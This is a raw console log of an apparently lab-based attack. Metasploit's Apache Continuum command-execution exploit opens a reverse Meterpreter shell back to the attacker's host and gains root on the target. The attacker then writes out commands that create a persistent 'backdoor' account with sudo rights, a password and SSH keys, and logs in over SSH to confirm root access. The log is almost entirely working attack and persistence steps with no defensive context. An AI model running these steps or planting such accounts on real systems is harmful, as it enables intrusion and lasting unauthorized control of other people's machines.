```console
msf6 exploit(multi/http/cups_bash_env_exec) > search apache continuum

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/apache_continuum_cmd_exec  2016-04-06       excellent  Yes    Apache Continuum Arbitrary Command Execution

msf6 exploit(linux/http/apache_continuum_cmd_exec) > show options

Module options (exploit/linux/http/apache_continuum_cmd_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.0.207    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    8080             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.156    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Apache Continuum <= 1.4.2



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/apache_continuum_cmd_exec) > exploit
[*] Started reverse TCP handler on 192.168.0.156:4444 
[*] Injecting CmdStager payload...
[*] Sending stage (3045380 bytes) to 192.168.0.207
[*] Meterpreter session 1 opened (192.168.0.156:4444 -> 192.168.0.207:37150) at 2025-03-06 16:28:56 -0500
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter > getuid
Server username: root
meterpreter > shell
Process 2576 created.
Channel 1 created.

whoami
root

id
uid=0(root) gid=0(root) groups=0(root)
```


```
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor

grep backdoor /etc/passwd
backdoor:x:1126:1126::/home/backdoor:/bin/bash

mkdir -p /home/backdoor/.ssh
chmod 700 /home/backdoor/.ssh
echo "XXXX" > /home/backdoor/.ssh/authorized_keys
chmod 600 /home/backdoor/.ssh/authorized_keys
chown -R backdoor:backdoor /home/backdoor/.ssh

```


```console
└─$ ssh -i ~/.ssh/id_ed25519 backdoor@192.168.0.207
Warning: Identity file /home/vagrant/.ssh/id_ed25519 not accessible: No such file or directory.
The authenticity of host '192.168.0.207 (192.168.0.207)' can't be established.
ED25519 key fingerprint is XXXXX
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '192.168.0.207' (ED25519) to the list of known hosts.
backdoor@192.168.0.207's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

backdoor@ubuntu:~$ id
uid=1126(backdoor) gid=1126(backdoor) groups=1126(backdoor),27(sudo)
backdoor@ubuntu:~$ sudo id
[sudo] password for backdoor: 
uid=0(root) gid=0(root) groups=0(root)

```
